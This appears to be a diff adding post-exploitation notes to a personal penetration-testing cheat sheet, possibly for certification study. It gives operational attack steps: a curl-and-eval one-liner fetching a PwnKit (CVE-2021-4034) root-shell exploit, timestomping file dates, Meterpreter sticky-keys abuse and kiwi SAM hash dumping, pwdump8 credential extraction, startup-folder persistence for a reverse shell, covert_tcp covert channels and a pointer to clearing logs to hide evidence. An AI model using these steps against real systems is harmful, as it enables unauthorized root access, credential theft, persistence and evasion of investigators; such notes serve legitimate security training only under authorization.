@@ -252,4 +252,116 @@ https://null-byte.wonderhowto.com/how-to/bypass-uac-escalate-privileges-windows-
 
 `To get all information regarding privilege escalation use WinPEAS/LinPEAS`
 
+
+###### Post Exploitation Tools
+
+>[!check] MACE
+>- M - Modified
+>- A - Accessed
+>- C - Created
+>- E - Entry Modified
+`timestomp [filename] -v`  :- To view MACE Information
+`timestomp [filename] -m/-a/-c/-e  'date format | time format'`
+
+To search any file in meterpreter session search -f [filename]
+
+To retreive Hidden Directories
+- Enter shell mode from meterpreter session
+
+`dir /a:h`
+
+![img](https://i.postimg.cc/T2mRsmMf/screenshot-97.jpg)
+
+###### PKEXEC vulnerability to get root shell
+
+git  clone https://github.com/berdav/CVE-2021-4034.git  
+OR 
+oneliner command `eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"`
+
+Just execute make, `./cve-2021-4034` and enjoy your root shell
+
+Dry Run
+- To not execute a shell but just test if the system is vulnerable compile the dry-run target.
+- If the program exit printing "root" it means that your system is vulnerable to the exploit.
+- If your system is not vulnerable it prints an error and exit.
+
+###### NFS Exploitation
+`showmount -e [ip]`  
+if found any share 
+`mkdir /tmp/nfs`
+`sudo mount -t nfs [ip]:/share /tmp/nfs`
+
+###### Bypassing UAC & Exploiting Sticky Keys
+- Get Meterpreter Root Shell usnign above mentioned steps
+- Background the session
+- Use module windows/manage/sticky_keys
+- exploit
+
+###### Escalate Privileges & Gather Hashdump
+- Get Meterpreter Root Shell usnign above mentioned steps
+- `load kiwi`
+- `help kiwi`
+- `lsa_dump_sam`
+- `password_change -u [username] -n [old NTLM Hash] -P [new password]`
+
+Hash dump with pwdump8 and crack with JTR
+
+wmic useraccount get name,sid --> Get user acc names and SID
+https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
+`pwdump8.exe > c:\hashes.txt`
+
+---Stegnography---
+
+WhiteSpace Stegnography
+`sudo apt install stegsnow`
+
+To Hide Data
+`stegsnow -C  -m "String that u need to hide" -p "password"  [file1.txt(old_file)] [file2.txt (output_File)]`
+https://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html
+
+To Read Data
+`stegsnow -C  -p "password" [filename.txt]`
+
+OpenStego - Windows Stegnography Tool
+
+---Maintain Persistence by Abusing Boot Logon Autostart---
+- Make 2 payload file one for getting meterpreter session & second one for dumping the payload to startup folder
+ "use different ports for different payloads"
+- Get Meterpreter Root Shell usnign above mentioned steps
+- Background the session
+- Escalate Privileges
+- Place the payload file to startup loction 
+
+`C:\\ProgramData\\StartMenu\\Programs\\Startup`
+
+`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`
+
+- Restart the Windows Machine
+- Get the Reverse Shell
+
+---Maintain Domain Persistence by Exploiting Active Directory Objects---
+
+---Privilege Escalation Maintain Persistence using WMI---
+
+---Covert Channels sing Covert_TCP---
+Download covert_tcp file 
+>https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwisuI2Mirj8AhV4zzgGHanDDYAQFnoECAkQAQ&url
+=http%3A%2F%2Fwww-scf.usc.edu%2F~csci530l%2Fdownloads%2Fcovert_tcp.c&usg=AOvVaw2iAVfjGEAO5q-aAqYVps1d
+
+1. compile the covert_tcp file
+
+`cc -o covert_tcp covert_tcp.c`
+
+2. Receiving Command
+
+`./covert_tcp -source 192.168.1.108 -source_port 8888 -server -file [file_receive.txt]`
+
+3. Send Command
+	Make a text file to send
+	`./covert_tcp -dest 192.168.1.100 -source 192.168.1.108 -source_port 9999 -dest_port 8888 -file [file_send.txt]`
+
+---Clear Logs to Hide Evidence---
+[CLEARING LOGS - Windows](simplenote://note/676ec02f-ed17-4ea0-8c7e-4c58d8b77c86)
+
+
 #Stay tuned for more
